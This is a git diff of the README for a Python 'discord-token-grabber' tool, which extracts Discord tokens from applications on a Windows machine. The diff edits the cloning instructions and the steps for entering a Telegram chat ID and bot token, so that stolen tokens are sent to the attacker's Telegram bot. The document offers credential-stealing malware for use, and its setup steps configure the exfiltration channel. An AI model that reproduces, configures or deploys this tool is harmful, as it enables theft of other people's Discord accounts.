@@ -26,8 +26,11 @@ This Python script extracts Discord tokens from various applications on a Window
 ## Installation
 
 1. **Clone the Repository**:
+
+```bash
    git clone https://github.com/yourusername/discord-token-grabber.git
    cd discord-token-grabber
+```
 
 2. **Install Dependencies**:
    The script automatically installs missing modules (`pypiwin32`, `pycryptodome`) on first run. Alternatively, install them manually:
@@ -42,14 +45,17 @@ This Python script extracts Discord tokens from various applications on a Window
 1. **Edit the Script**:
 
 - Open `main.py`.
-- Replace `"Enter your telegram bot token here..."` in the `main()` call at the bottom with your Telegram bot token:
+- Replace the chat_id in the data dictionary with your Telegram chat ID: **Line 198**
+
+  ```python
+  "chat_id": "your_chat_id",
+  ```
+
+  Replace the Telegram bot token placeholder **Line 216**
+
   ```python
   if __name__ == "__main__":
-      main("12345:ABCDEF...")
-  ```
-- Replace the chat_id in the data dictionary with your Telegram chat ID:
-  ```python
-  "chat_id": "-ๅ23456789",  # Change to your chat ID
+      main("Your_teleram_bot_token")
   ```
 
 2. **Run the Script:**
